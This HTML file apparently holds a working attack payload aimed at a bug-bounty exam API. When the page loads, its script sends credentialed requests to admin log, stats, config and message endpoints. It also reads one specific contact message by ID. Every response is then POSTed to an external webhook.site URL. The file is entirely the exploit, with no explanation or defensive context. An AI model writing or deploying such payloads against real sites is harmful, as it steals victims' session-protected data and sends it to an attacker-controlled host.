<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
        const base = "https://api-bugbounty-exam.hashacademy.co";

        // Paths most likely to contain the final HASH{...} flag
        const targets = [
            "/api/v1/admin/logs",
            "/api/v1/admin/stats",
            "/api/v1/system/config",
            "/api/admin/messages/all"
        ];

        targets.forEach(path => {
            fetch(base + path, { credentials: "include" })
                .then(r => r.text())
                .then(data => {
                    // We send the data to your webhook
                    fetch(webh, {
                        method: "POST",
                        body: JSON.stringify({ path: path, result: data })
                    });
                }).catch(e => {});
        });

        // The "Hail Mary" - Try to read the specific message details again
        // since you have the most recent ID
        fetch(base + "/api/v1/contact/messages/69ea4208bee6d6b7c6645889", { credentials: "include" })
            .then(r => r.text())
            .then(d => fetch(webh, { method: "POST", body: JSON.stringify({ type: "MSG_ID_LEAK", data: d })}));
    </script>
</body>
</html>
